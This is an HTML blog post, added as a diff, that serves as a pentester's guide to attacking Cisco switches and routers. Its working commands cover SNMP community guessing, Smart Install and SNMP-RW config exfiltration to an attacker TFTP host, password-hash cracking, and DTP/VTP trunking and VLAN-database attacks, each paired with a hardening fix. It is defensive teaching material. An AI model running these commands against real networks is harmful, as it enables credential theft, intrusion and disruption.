@@ -1,0 +1,393 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; form-action 'self'; object-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'self'; worker-src 'self' blob:;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<style>.writeup-back-link:hover{transform:translateX(-2px);background:rgba(26,26,24,1)!important;}</style>
+<title>Attacking Cisco Gear — A Pentester's Field Guide — SP1R4 / NOCTIS</title>
+<meta name="description" content="The offensive companion to the IOS series: what an attacker actually does to a Cisco switch or router — CDP/SNMP recon, Smart Install config theft, SNMP-RW config exfil, type-7/5/8/9 password cracking, and DTP/VTP Layer-2 abuse — with the one-line fix for each.">
+<meta property="og:title" content="Attacking Cisco Gear — A Pentester's Field Guide — NOCTIS">
+<meta property="og:description" content="The offensive companion to the IOS series: what an attacker actually does to a Cisco switch or router — CDP/SNMP recon, Smart Install config theft, SNMP-RW config exfil, password cracking, and DTP/VTP Layer-2 abuse — with the one-line fix for each.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://sp1r4.github.io/writeups/cisco-attacking-ios.html">
+<meta property="og:image" content="https://sp1r4.github.io/writeups/assets/og/cisco-attacking-ios.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sp1r4.github.io/writeups/assets/og/cisco-attacking-ios.png">
+<link rel="canonical" href="https://sp1r4.github.io/writeups/cisco-attacking-ios.html">
+
+
+
+<link rel="stylesheet" href="../fonts/inter.css">
+<link rel="stylesheet" href="../fonts/display.css">
+<link rel="stylesheet" href="../style.css">
+<style>
+  :root{--bg:#f0efe9;--card:#fff;--code-bg:#e8e6e0;--term-bg:#e8e6e0;--rule:#e0deda;--body:#5e5a52;--mid:#0f0f0f;--head:#0f0f0f;--accent:#c63d1f;--gotcha:#c08020;--defender:#3a5a78;--font-disp:'Barlow Condensed',sans-serif;--font-body:'Inter',-apple-system,sans-serif;--font-mono:'JetBrains Mono',monospace;}
+  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+  html{font-size:16px;background:var(--bg);color:var(--body);}
+  body{font-family:var(--font-body);font-weight:400;line-height:1.7;background:var(--bg);min-height:100vh;}
+  a{color:var(--accent);text-decoration:none;}a:hover{text-decoration:underline;}
+  .wrap{position:relative;z-index:1;width:100%;max-width:760px;margin:0 auto;padding:3rem 1.5rem 5rem;}
+  .post-meta{font-size:.78rem;letter-spacing:.06em;text-transform:uppercase;color:var(--body);margin-bottom:.8rem;}
+  .post-meta span{color:var(--accent);font-weight:600;}
+  h1.post-title{font-family:var(--font-disp);font-weight:900;font-size:3rem;line-height:1.05;color:var(--head);text-transform:uppercase;letter-spacing:.02em;margin-bottom:1rem;}
+  .post-subtitle{font-size:1.05rem;color:var(--mid);font-weight:400;margin-bottom:1.4rem;line-height:1.5;}
+  .tags{display:flex;flex-wrap:wrap;gap:.4rem;margin-bottom:2rem;}
+  .tag{font-family:var(--font-body);font-weight:600;font-size:.7rem;letter-spacing:.06em;text-transform:uppercase;border:1px solid var(--head);border-radius:999px;padding:.18em .75em;color:var(--mid);}
+  hr.title-rule{border:none;border-top:1px solid var(--rule);margin-bottom:2rem;}
+  .thesis-card{background:var(--card);border-radius:6px;border-left:3px solid var(--accent);padding:1.6rem 1.8rem;margin-bottom:2.6rem;}
+  .thesis-card p{color:var(--mid);font-size:.98rem;line-height:1.7;}
+  .thesis-card p+p{margin-top:.8rem;}
+  .prereqs-label{font-family:var(--font-disp);font-weight:700;font-size:.8rem;letter-spacing:.1em;text-transform:uppercase;color:var(--accent);margin-top:1.2rem;margin-bottom:.5rem;}
+  .prereqs-list{list-style:none;padding:0;}
+  .prereqs-list li{font-size:.88rem;color:var(--mid);padding:.15rem 0 .15rem 1rem;position:relative;}
+  .prereqs-list li::before{content:"›";position:absolute;left:0;color:var(--accent);font-weight:700;}
+  .section-num{font-family:var(--font-disp);font-weight:700;font-size:.82rem;letter-spacing:.14em;text-transform:uppercase;color:var(--accent);margin-bottom:.2rem;margin-top:2.8rem;}
+  h2.section-title{font-family:var(--font-disp);font-weight:800;font-size:1.9rem;color:var(--head);text-transform:uppercase;letter-spacing:.03em;line-height:1.1;margin-bottom:.5rem;}
+  .section-thesis{font-style:italic;color:var(--mid);font-size:.95rem;margin-bottom:1.4rem;line-height:1.6;border-bottom:1px solid var(--rule);padding-bottom:.8rem;}
+  h3.sub{font-family:var(--font-disp);font-weight:700;font-size:1.15rem;color:var(--mid);text-transform:uppercase;letter-spacing:.06em;margin:1.6rem 0 .5rem;}
+  p{margin-bottom:1rem;color:var(--body);font-size:.96rem;}
+  strong{color:var(--mid);font-weight:600;}
+  .term-wrap{background:var(--term-bg);border-radius:5px;border:1px solid var(--rule);margin:1.2rem 0;overflow-x:auto;}
+  .term-label{font-family:var(--font-disp);font-weight:700;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--body);background:var(--rule);padding:.3rem .9rem;display:block;border-bottom:1px solid var(--rule);}
+  pre.term{font-family:var(--font-mono);font-size:.82rem;line-height:1.75;padding:1rem 1.2rem;white-space:pre;color:var(--mid);background:none;border:none;margin:0;}
+  span.pc{color:var(--accent);font-weight:500;}
+  span.out{color:var(--mid);}
+  span.cmt{color:var(--body);font-style:italic;}
+  span.key{color:var(--accent);font-weight:600;font-style:normal;}
+  code{font-family:var(--font-mono);font-size:.82em;background:var(--code-bg);border:1px solid var(--rule);border-radius:3px;padding:.1em .4em;color:var(--mid);}
+  .callout{border-radius:5px;padding:1rem 1.2rem;margin:1.4rem 0;font-size:.9rem;}
+  .callout-label{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;display:block;margin-bottom:.4rem;}
+  .callout p{margin:0;font-size:.9rem;}
+  .callout p+p{margin-top:.5rem;}
+  .gotcha{background:var(--card);border-left:3px solid var(--gotcha);}
+  .gotcha .callout-label{color:var(--gotcha);}
+  .didnt-work{background:var(--code-bg);border-left:3px solid var(--rule);}
+  .didnt-work .callout-label{color:var(--body);}
+  .defender{background:var(--card);border-left:3px solid var(--defender);}
+  .defender .callout-label{color:var(--defender);}
+  .diagram-wrap{margin:1.6rem 0;border-radius:6px;border:1px solid var(--rule);overflow:hidden;background:var(--card);}
+  .diagram-wrap svg{display:block;width:100%;height:auto;}
+  kbd{display:inline-block;font-family:var(--font-mono);font-size:.75em;background:var(--head);color:#eae8e3;border-radius:4px;padding:.1em .5em;margin:0 .1em;font-weight:500;letter-spacing:.02em;}
+  .cheat{width:100%;border-collapse:collapse;margin:1.2rem 0;font-size:.85rem;}
+  .cheat th{font-family:var(--font-disp);font-weight:700;font-size:.72rem;letter-spacing:.1em;text-transform:uppercase;background:var(--rule);color:var(--mid);padding:.4rem .8rem;text-align:left;}
+  .cheat td{padding:.4rem .8rem;border-bottom:1px solid var(--rule);vertical-align:top;}
+  .cheat tr:nth-child(even) td{background:var(--card);}
+  .cheat td:first-child{font-family:var(--font-mono);font-size:.8rem;color:var(--accent);white-space:nowrap;}
+  .cheat td:last-child{color:var(--body);font-size:.82rem;}
+  .safe-badge{display:inline-block;font-family:var(--font-disp);font-weight:700;font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;background:#3a5a78;color:#fff;border-radius:3px;padding:.1em .5em;margin-left:.4rem;vertical-align:middle;}
+  .danger-badge{display:inline-block;font-family:var(--font-disp);font-weight:700;font-size:.65rem;letter-spacing:.1em;text-transform:uppercase;background:var(--accent);color:#fff;border-radius:3px;padding:.1em .5em;margin-left:.4rem;vertical-align:middle;}
+  .takeaways{background:var(--card);border-radius:6px;padding:1.6rem 1.8rem;margin:2.4rem 0;}
+  .takeaways-title{font-family:var(--font-disp);font-weight:800;font-size:1.1rem;letter-spacing:.08em;text-transform:uppercase;color:var(--head);margin-bottom:1rem;}
+  .takeaways ol{padding-left:1.4rem;}
+  .takeaways li{font-size:.92rem;color:var(--mid);margin-bottom:.55rem;line-height:1.55;}
+  .cta-card{background:var(--card);border-radius:6px;border-top:3px solid var(--accent);padding:1.8rem 2rem;margin-top:2.8rem;text-align:center;}
+  .cta-card h3{font-family:var(--font-disp);font-weight:800;font-size:1.5rem;text-transform:uppercase;letter-spacing:.04em;color:var(--head);margin-bottom:.6rem;}
+  .cta-card p{font-size:.93rem;color:var(--mid);max-width:520px;margin:0 auto 1.2rem;}
+  .cta-btn{display:inline-block;background:var(--accent);color:#fff;font-family:var(--font-disp);font-weight:700;font-size:.85rem;letter-spacing:.1em;text-transform:uppercase;padding:.65em 1.8em;border-radius:4px;transition:opacity .15s;}
+  .cta-btn:hover{opacity:.88;text-decoration:none;}
+  footer{border-top:1px solid var(--rule);margin-top:4rem;padding:1.2rem 1.5rem;display:flex;justify-content:space-between;align-items:center;font-size:.78rem;color:var(--body);letter-spacing:.04em;}
+  footer a{color:var(--body);}footer a:hover{color:var(--accent);}
+</style>
+<script src="../js/theme.js"></script>
+<style>
+  body.dark {
+    --bg:#0f0f0f; --card:#1a1a1a; --code-bg:#161616; --term-bg:#161616; --rule:#2a2a2a;
+    --body:#959086; --mid:#f4f3ef; --head:#f4f3ef; --accent:#c63d1f;
+    --gotcha:#d9a441; --defender:#6f9fc9;
+  }
+</style>
+<script id="noctis-jsonld" type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Attacking Cisco Gear — A Pentester's Field Guide",
+  "description": "The offensive companion to the IOS series: what an attacker actually does to a Cisco switch or router — CDP/SNMP recon, Smart Install config theft, SNMP-RW config exfil, type-7/5/8/9 password cracking, and DTP/VTP Layer-2 abuse — with the one-line fix for each.",
+  "datePublished": "2026-07-30",
+  "dateModified": "2026-07-30",
+  "author": {
+    "@type": "Person",
+    "name": "S. Markakis",
+    "url": "https://sp1r4.github.io/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "NOCTIS",
+    "url": "https://sp1r4.github.io/"
+  },
+  "url": "https://sp1r4.github.io/writeups/cisco-attacking-ios.html",
+  "image": "https://sp1r4.github.io/writeups/assets/og/cisco-attacking-ios.png",
+  "keywords": [
+    "cisco",
+    "security"
+  ],
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://sp1r4.github.io/blog.html#cisco-attacking-ios"
+  },
+  "timeRequired": "PT11M"
+}
+</script>
+</head>
+<body class="has-nav">
+<nav id="site-nav"></nav>
+<a href="../blog.html" class="writeup-back-link" style="position:fixed;top:66px;left:18px;z-index:51;display:inline-flex;align-items:center;gap:8px;padding:8px 14px;background:rgba(26,26,24,0.92);color:#eae8e3;font-family:'Inter',-apple-system,sans-serif;font-size:12px;font-weight:500;letter-spacing:0.04em;text-decoration:none;border-radius:4px;border:0.5px solid rgba(234,232,227,0.15);backdrop-filter:blur(8px);transition:transform 0.18s,background 0.18s;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>Back to blog</a>
+
+<div class="wrap">
+
+  <p class="post-meta"><span>Cisco / Offensive</span> &nbsp;·&nbsp; Security &nbsp;·&nbsp; July 2026</p>
+  <h1 class="post-title">Attacking Cisco Gear<br>A Pentester's Field Guide</h1>
+  <p class="post-subtitle">The whole series so far builds and hardens IOS. This post is the other side of the table: what I actually run against a Cisco switch or router on an engagement, and why each attack works. Every technique here maps back to a one-line fix from earlier posts — that's the point. You harden what you understand gets attacked.</p>
+  <div class="tags">
+    <span class="tag">Cisco IOS</span>
+    <span class="tag">Offensive</span>
+    <span class="tag">Pentest</span>
+    <span class="tag">Smart Install</span>
+    <span class="tag">SNMP</span>
+    <span class="tag">Layer 2</span>
+  </div>
+  <hr class="title-rule">
+
+  <!-- Hero diagram -->
+  <div class="diagram-wrap" style="margin-bottom:2rem;">
+    <svg viewBox="0 0 720 210" xmlns="http://www.w3.org/2000/svg">
+      <rect width="720" height="210" fill="#e1ded7"/>
+      <!-- attacker -->
+      <rect x="24" y="82" width="120" height="46" rx="6" fill="#e8c8c0" stroke="#c63d1f"/>
+      <text x="84" y="102" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#c63d1f;text-anchor:middle;">Attacker</text>
+      <text x="84" y="118" style="font-family:ui-monospace,monospace;font-size:8px;fill:#c63d1f;text-anchor:middle;">on-LAN / access port</text>
+      <!-- switch -->
+      <rect x="300" y="76" width="120" height="58" rx="6" fill="#cfe0ee" stroke="#3a5a78"/>
+      <text x="360" y="98" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#3a5a78;text-anchor:middle;">Catalyst / ISR</text>
+      <text x="360" y="114" style="font-family:ui-monospace,monospace;font-size:8px;fill:#3a5a78;text-anchor:middle;">IOS target</text>
+      <path d="M144 105 L300 105" stroke="#8a8880" stroke-width="2"/>
+      <!-- attack labels -->
+      <text x="222" y="60"  style="font-family:ui-monospace,monospace;font-size:8.5px;fill:#c63d1f;text-anchor:middle;">CDP leak · SNMP · SMI 4786</text>
+      <text x="222" y="160" style="font-family:ui-monospace,monospace;font-size:8.5px;fill:#c63d1f;text-anchor:middle;">DTP trunk-negotiation · VTP</text>
+      <!-- loot -->
+      <rect x="576" y="82" width="120" height="46" rx="6" fill="#d8e8d0" stroke="#558840"/>
+      <text x="636" y="102" style="font-family:'Inter',sans-serif;font-weight:700;font-size:11px;fill:#3a6a28;text-anchor:middle;">running-config</text>
+      <text x="636" y="118" style="font-family:ui-monospace,monospace;font-size:8px;fill:#3a6a28;text-anchor:middle;">creds · SNMP · keys</text>
+      <path d="M420 105 L576 105" stroke="#8a8880" stroke-width="2" stroke-dasharray="4,3"/>
+      <text x="498" y="98" style="font-family:ui-monospace,monospace;font-size:8px;fill:#888880;text-anchor:middle;">exfil</text>
+      <text x="360" y="196" style="font-family:'Inter',sans-serif;font-size:9px;fill:#888880;text-anchor:middle;">Most Cisco compromises are configuration, not code — old defaults left on, not zero-days.</text>
+    </svg>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ Scope &amp; Authorized Use</span>
+    <p>Everything below is for <strong>authorized security testing</strong> — your own lab, a CTF, or an engagement with written scope — and to show defenders exactly what they're hardening against. Running these against gear you don't own or aren't contracted to test is illegal. The commands assume a lab (GNS3/CML/EVE-NG or kit on your bench); the payoff is the <em>fix</em> in each section, cross-linked to the defensive posts in this series.</p>
+  </div>
+
+  <!-- Thesis -->
+  <div class="thesis-card">
+    <p>Here's the uncomfortable truth from years of network pentests: you almost never <em>exploit</em> a Cisco box in the CVE sense. You <strong>collect it</strong>. The device hands you its own config through a management protocol nobody turned off, or an access port negotiates itself into a trunk, or a "temporary" SNMP community from 2014 is still <code>private</code>. The attack surface is the sum of every default the last engineer didn't disable.</p>
+    <p>This guide walks the real kill-chain in order: <strong>recon</strong> (CDP/LLDP and SNMP tell you the model, IOS version, and management IP for free), <strong>config theft</strong> (Smart Install and SNMP-RW both hand over <code>running-config</code> unauthenticated), <strong>credential cracking</strong> (the password types in that config, from the trivially-reversible type&nbsp;7 to the crackable type&nbsp;5), and <strong>Layer-2 abuse</strong> (DTP and VTP, the switch attacks that get you into VLANs you shouldn't reach). Each section ends with the single command that closes it.</p>
+    <div class="prereqs-label">Pairs with</div>
+    <ul class="prereqs-list">
+      <li>The defensive originals: <a href="cisco-hardening.html">Management-Plane Hardening</a>, <a href="cisco-switch-security.html">Switch Security</a></li>
+      <li><a href="cisco-observability.html">Observability</a> (SNMP done right) and <a href="cisco-vlans-trunking.html">VLANs &amp; Trunking</a> (what DTP abuses)</li>
+      <li>A lab you own — never point these at production you aren't scoped for</li>
+    </ul>
+  </div>
+
+  <!-- 01 -->
+  <p class="section-num">01</p>
+  <h2 class="section-title">Recon — The Device Introduces Itself <span class="safe-badge">Passive</span></h2>
+  <p class="section-thesis"><em>Before touching anything, listen. Cisco Discovery Protocol broadcasts the device's identity to every access port every 60 seconds — model, IOS version, native VLAN, and management IP, no auth required. It's the friendliest recon in networking.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Attacker (on-LAN) — sniff CDP/LLDP, then fingerprint over SNMP</span>
+    <pre class="term"><span class="cmt"># CDP frames are multicast to 01:00:0c:cc:cc:cc every ~60s.
+# Sit on an access port and wait one interval.</span>
+<span class="pc">$</span> <span class="out">tcpdump -nn -v -i eth0 'ether host 01:00:0c:cc:cc:cc' -c 1</span>
+<span class="out">  Device-ID 'CoreSW1.corp.local'  Version 'Cisco IOS ... Version 15.2(4)E7'
+  Platform 'cisco WS-C2960X-48'  Address 10.10.0.2  Native VLAN 99  VTP 'CORP'</span>
+
+<span class="cmt"># That one frame gave us model, IOS train, mgmt IP, native VLAN, VTP domain.
+# Now confirm SNMP and guess communities (public/private/cisco are forever).</span>
+<span class="pc">$</span> <span class="out">onesixtyone -c /usr/share/wordlists/snmp.txt 10.10.0.2</span>
+<span class="out">10.10.0.2 [private] Cisco IOS Software, C2960X ... Version 15.2(4)E7</span>
+
+<span class="pc">$</span> <span class="out">snmpwalk -v2c -c private 10.10.0.2 | head</span>   <span class="cmt"># RW community — jackpot</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ The Fix — Turn Off What You Don't Need</span>
+    <p>CDP belongs between your own devices, never toward users or the edge: <code>no cdp run</code> globally, or <code>no cdp enable</code> per untrusted interface (prefer LLDP only where a phone genuinely needs it). SNMP: kill v1/v2c entirely and move to <strong>SNMPv3 with auth+priv</strong> — see <a href="cisco-observability.html">Observability</a>. If a community string must exist, it is never a dictionary word, and RW communities have no reason to exist on most networks at all.</p>
+  </div>
+
+  <!-- 02 -->
+  <p class="section-num">02</p>
+  <h2 class="section-title">Smart Install — The Config Vending Machine <span class="danger-badge">Unauthenticated</span></h2>
+  <p class="section-thesis"><em>Smart Install (SMI) is a zero-touch provisioning feature that listens on TCP&nbsp;4786 and, on unpatched/unconfigured switches, will accept a crafted message that makes the switch TFTP its own running-config to an address you choose — no credentials. It shipped enabled on a generation of Catalysts and is still everywhere.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Attacker — detect SMI, then pull the config (SIET / Nmap)</span>
+    <pre class="term"><span class="cmt"># 1. Is Smart Install listening? (TCP 4786)</span>
+<span class="pc">$</span> <span class="out">nmap -p4786 -sV --script cisco-smart-install 10.10.0.0/24</span>
+<span class="out">10.10.0.2  4786/tcp open  smart-install
+  | cisco-smart-install: Device is a Smart Install Client and vulnerable</span>
+
+<span class="cmt"># 2. Start a TFTP server to catch the loot.</span>
+<span class="pc">$</span> <span class="out">sudo atftpd --daemon --port 69 /tmp/loot</span>
+
+<span class="cmt"># 3. SIET: tell the switch to copy running-config to us over TFTP.</span>
+<span class="pc">$</span> <span class="out">python3 siet.py -g -r 10.10.0.2 -l 10.10.0.66</span>
+<span class="out">[*] Sending config-copy request to 10.10.0.2 ...
+[+] Received CoreSW1-confg (14 KB) -> /tmp/loot/CoreSW1-confg</span>
+
+<span class="cmt"># The full running-config, including every password hash and key, unauthenticated.</span>
+<span class="pc">$</span> <span class="out">grep -E 'secret|password|snmp|key ' /tmp/loot/CoreSW1-confg</span></pre>
+  </div>
+
+  <div class="callout gotcha">
+    <span class="callout-label">⚠ Gotcha — "We Never Configured Smart Install"</span>
+    <p>That's exactly the problem. SMI is <strong>on by default</strong> when there's no <code>vstack</code> configuration — the absence of config is the vulnerable state, not the presence of it. <code>show vstack config</code> reporting the role as <em>Client (SmartInstall enabled)</em> on a switch that was never meant to be provisioned this way is the tell. This single feature has driven mass internet-wide config theft campaigns; treat any 4786 exposed to users as a full compromise.</p>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ The Fix — One Command</span>
+    <p><code>no vstack</code> in global config disables Smart Install outright. If you genuinely can't (rare), restrict 4786 with an <a href="cisco-acls.html">ACL</a> to the provisioning server only. Verify with <code>show vstack config</code> → <em>Role: Client (SmartInstall disabled)</em>. This is the highest-value one-liner in the whole hardening series.</p>
+  </div>
+
+  <!-- 03 -->
+  <p class="section-num">03</p>
+  <h2 class="section-title">SNMP-RW — Copy the Config With a Set <span class="danger-badge">Read-Write</span></h2>
+  <p class="section-thesis"><em>A read-write SNMP community isn't "read a few OIDs" — it's an API into the device. With the CISCO-CONFIG-COPY-MIB you tell the switch to TFTP its running-config to you, using nothing but <code>snmpset</code>. Same loot as Smart Install, different unlocked door.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Attacker — drive ccCopyTable to exfil running-config over TFTP</span>
+    <pre class="term"><span class="cmt"># RW community 'private' from recon. Row index 111 is arbitrary.
+# ccCopyProtocol=1(tftp) SourceFileType=4(running) DestFileType=1(networkFile)</span>
+<span class="pc">$</span> <span class="out">snmpset -v2c -c private 10.10.0.2 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.2.111 i 1 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.3.111 i 4 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.4.111 i 1 \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.5.111 a "10.10.0.66" \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.6.111 s "CoreSW1.cfg" \
+    1.3.6.1.4.1.9.9.96.1.1.1.1.14.111 i 1</span>       <span class="cmt"># RowStatus=createAndGo</span>
+<span class="out">  ... ccCopyState.111 = running   ->   success</span>
+
+<span class="cmt"># Config lands on your TFTP server. Metasploit has this canned:</span>
+<span class="pc">$</span> <span class="out">msfconsole -qx "use auxiliary/scanner/snmp/cisco_config_tftp; \
+    set RHOSTS 10.10.0.2; set COMMUNITY private; run; exit"</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ The Fix — No v2c, No RW, No Words</span>
+    <p>The whole attack dies without a guessable RW community. Migrate to <strong>SNMPv3</strong> (authPriv), remove every <code>snmp-server community</code> line, and if legacy v2c is unavoidable, bind it read-only to a management ACL and use a random 20+ char string — never <code>public</code>/<code>private</code>/the hostname. See <a href="cisco-observability.html">Observability</a> for the v3 build. Bonus: log <code>snmp-server</code> config-copy events to <a href="cisco-observability.html">syslog</a> so an exfil attempt is visible.</p>
+  </div>
+
+  <!-- 04 -->
+  <p class="section-num">04</p>
+  <h2 class="section-title">Cracking What's in the Config</h2>
+  <p class="section-thesis"><em>You have the running-config. Now the password hashes in it become creds — and Cisco's password "types" range from instantly reversible to genuinely strong. Knowing which is which tells you what's worth cracking and what falls in seconds.</em></p>
+
+  <table class="cheat">
+    <thead><tr><th>Type in config</th><th>Algorithm</th><th>Attacker effort</th></tr></thead>
+    <tbody>
+      <tr><td>password 7 09424B1C…</td><td>Vigenère (obfuscation)</td><td><strong>Instant</strong> — reversible, not a hash</td></tr>
+      <tr><td>secret 5 $1$…</td><td>MD5-crypt</td><td>Fast — hashcat <code>-m 500</code></td></tr>
+      <tr><td>secret 4 $4$…</td><td>plain SHA-256 (broken impl)</td><td>Fast — deprecated by Cisco</td></tr>
+      <tr><td>secret 8 $8$…</td><td>PBKDF2-SHA256</td><td>Slow — hashcat <code>-m 9200</code></td></tr>
+      <tr><td>secret 9 $9$…</td><td>scrypt</td><td>Slowest — hashcat <code>-m 9300</code></td></tr>
+    </tbody>
+  </table>
+
+  <div class="term-wrap">
+    <span class="term-label">Attacker — reverse type 7 instantly, crack type 5 offline</span>
+    <pre class="term"><span class="cmt"># Type 7 is NOT encryption — it's reversible obfuscation. Decode instantly:</span>
+<span class="pc">$</span> <span class="out">echo '09424B1C0007' | ciscot7 -d -</span>
+<span class="out">  cisco</span>
+<span class="cmt"># (any type-7 decoder does it; there's nothing to "crack")</span>
+
+<span class="cmt"># Type 5 (MD5-crypt) — pull from config and throw a wordlist at it.</span>
+<span class="pc">$</span> <span class="out">grep 'secret 5' CoreSW1-confg</span>
+<span class="out">  enable secret 5 $1$mERr$hx5rVt7rPNoS4wqbXKX7m0</span>
+<span class="pc">$</span> <span class="out">hashcat -m 500 -a 0 '$1$mERr$hx5rVt7rPNoS4wqbXKX7m0' rockyou.txt</span>
+<span class="out">  $1$mERr$hx5rVt7rPNoS4wqbXKX7m0:cisco123</span></pre>
+  </div>
+
+  <div class="callout gotcha">
+    <span class="callout-label">⚠ Gotcha — <code>service password-encryption</code> Is Theatre</span>
+    <p>That command only applies <strong>type 7</strong> to plaintext passwords in the config — the reversible kind. It stops a shoulder-surfer, nothing more; anyone with the config has the cleartext in one command. It is not a substitute for real hashing. Use <code>enable secret</code> (never <code>enable password</code>), and prefer <strong>type 8 or 9</strong> for local users: <code>username admin algorithm-type scrypt secret &lt;pw&gt;</code>. Those are the two rows an attacker groans at.</p>
+  </div>
+
+  <!-- 05 -->
+  <p class="section-num">05</p>
+  <h2 class="section-title">Layer 2 — DTP &amp; VTP, the Switch's Own Weapons</h2>
+  <p class="section-thesis"><em>You don't always need the config. If an access port will negotiate a trunk, you get every VLAN. Dynamic Trunking Protocol (DTP) is on by default on many ports, and it's a one-tool attack.</em></p>
+
+  <div class="term-wrap">
+    <span class="term-label">Attacker — negotiate a trunk, then reach every VLAN</span>
+    <pre class="term"><span class="cmt"># If the port is 'dynamic auto/desirable', DTP will happily trunk with us.
+# Yersinia forges DTP to flip the port into a trunk.</span>
+<span class="pc">$</span> <span class="out">yersinia dtp -attack 1 -interface eth0</span>
+<span class="out">  [+] Enabling trunking on the attached port ...</span>
+
+<span class="cmt"># Now create a subinterface per VLAN we saw in CDP and we're in all of them.</span>
+<span class="pc">$</span> <span class="out">vconfig add eth0 20 && ip addr add 10.20.0.66/24 dev eth0.20</span>
+<span class="pc">$</span> <span class="out">ip link set eth0.20 up && ping 10.20.0.1</span>   <span class="cmt"># VLAN 20 gateway — reachable</span>
+
+<span class="cmt"># VTP: if the domain is unauthenticated, inject a higher-revision
+# advertisement to rewrite/wipe the VLAN database fleet-wide (DoS).</span>
+<span class="pc">$</span> <span class="out">yersinia vtp -attack 0 -interface eth0</span></pre>
+  </div>
+
+  <div class="callout defender">
+    <span class="callout-label">◆ The Fix — Nail Down Access Ports</span>
+    <p>On every user/access port: <code>switchport mode access</code> and <code>switchport nonegotiate</code> so DTP can never negotiate a trunk. Set an unused, tagged native VLAN on real trunks (kills double-tagging too), and either run VTP <em>transparent</em> or set a VTP password so injected advertisements are rejected. This is the core of <a href="cisco-switch-security.html">Switch Security</a> — the DTP/VTP attacks exist precisely because the defaults are "negotiate freely."</p>
+  </div>
+
+  <!-- 06 -->
+  <p class="section-num">06</p>
+  <h2 class="section-title">The Attacker's Config Checklist</h2>
+  <p class="section-thesis"><em>When I get a running-config on an engagement, this is the grep pass — the lines that turn into findings. Run it against your own configs first.</em></p>
+
+  <table class="cheat">
+    <thead><tr><th>Look for</th><th>Why it's a finding</th></tr></thead>
+    <tbody>
+      <tr><td>no vstack absent</td><td>Smart Install exposed — unauth config theft (§02)</td></tr>
+      <tr><td>snmp-server community</td><td>v1/v2c community; RW = full compromise (§03)</td></tr>
+      <tr><td>enable password / password 7</td><td>Reversible or weak; cleartext-equivalent (§04)</td></tr>
+      <tr><td>secret 5 / secret 4</td><td>Crackable/deprecated hashes — move to 8/9 (§04)</td></tr>
+      <tr><td>switchport mode dynamic</td><td>DTP trunk negotiation → VLAN hopping (§05)</td></tr>
+      <tr><td>no transport input / telnet</td><td>Cleartext mgmt; sniffable creds — SSH only</td></tr>
+      <tr><td>cdp run on edge</td><td>Free recon handed to any user port (§01)</td></tr>
+      <tr><td>vtp mode server + no password</td><td>VLAN-DB injection / fleet DoS (§05)</td></tr>
+    </tbody>
+  </table>
+
+  <!-- TAKEAWAYS -->
+  <div class="takeaways">
+    <p class="takeaways-title">Takeaways</p>
+    <ol>
+      <li><strong>You collect Cisco boxes, you don't exploit them.</strong> The attack surface is leftover defaults — management protocols nobody disabled, not zero-days.</li>
+      <li><strong>Recon is free.</strong> CDP hands out model/version/mgmt-IP/VLAN on every access port; SNMP with a guessed community fingerprints the rest. <code>no cdp run</code> at the edge, SNMPv3 only.</li>
+      <li><strong>Smart Install is the highest-value target.</strong> TCP 4786 with no <code>vstack</code> config = unauthenticated running-config theft. <code>no vstack</code> closes it in one line.</li>
+      <li><strong>SNMP-RW is a config-copy API.</strong> A single <code>snmpset</code> sequence TFTPs the config to the attacker. Kill v2c and every RW community.</li>
+      <li><strong>Know your password types.</strong> Type 7 is instant, type 5 cracks fast, types 8/9 resist. <code>service password-encryption</code> protects nothing meaningful.</li>
+      <li><strong>Layer 2 is a way in.</strong> DTP negotiates trunks from access ports; VTP rewrites VLAN databases. <code>switchport mode access</code> + <code>nonegotiate</code> and a VTP password shut both.</li>
+      <li><strong>Every attack here has a one-line fix</strong> already covered in the defensive posts. Offense is just the argument for why you run them.</li>
+    </ol>
+  </div>
+
+  <div class="cta-card">
+    <h3>Want to know what your switches hand out before someone else finds out?</h3>
+    <p>NOCTIS runs authorized network penetration tests and configuration audits on Cisco and MikroTik estates across Crete — Smart Install, SNMP, weak creds, Layer-2 exposure — and hands you a prioritized, fix-first report, not a scanner dump.</p>
+    <a class="cta-btn" href="https://sp1r4.github.io/services.html">Book a Discovery Call →</a>
+  </div>
+
+</div>
+<footer>
+  <span>© 2026 NOCTIS — SP1R4</span>
+  <a href="https://sp1r4.github.io/blog.html">← All writeups</a>
+</footer>
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
